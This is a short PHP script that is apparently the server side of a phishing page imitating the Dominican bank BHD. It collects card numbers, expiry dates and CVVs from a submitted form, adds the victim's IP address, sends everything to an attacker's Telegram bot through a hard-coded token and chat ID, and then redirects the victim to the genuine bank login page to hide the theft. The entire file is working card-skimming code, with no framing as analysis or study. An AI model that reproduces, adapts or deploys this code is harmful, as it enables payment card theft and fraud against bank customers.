<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardNumber = $_POST["cardNumber"];
    $expiryDate = $_POST["expiryDate"];
    $cvv = $_POST["cvv"];

    $botToken = "8912252632:AAEJf_puzYmDrMbn_Y2kOqhWAMgc-wBc0VI";
    $chatID = "8555745789";

    $ip = $_SERVER['REMOTE_ADDR'];

    $message = "=====DATOS TARJETA BHD=======\nNúmero: $cardNumber\nExpira: $expiryDate\nCVV: $cvv\nIP del cliente: $ip";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array("chat_id" => $chatID, "text" => $message);
    $options = array(
        "http" => array(
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
            "content" => http_build_query($data)
        )
    );
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        // Redirige al sitio real del banco
        header("Location: https://ibp.bhd.com.do/#/login");
        exit;
    } else {
        header("Location: index");
        exit;
    }
}
?>
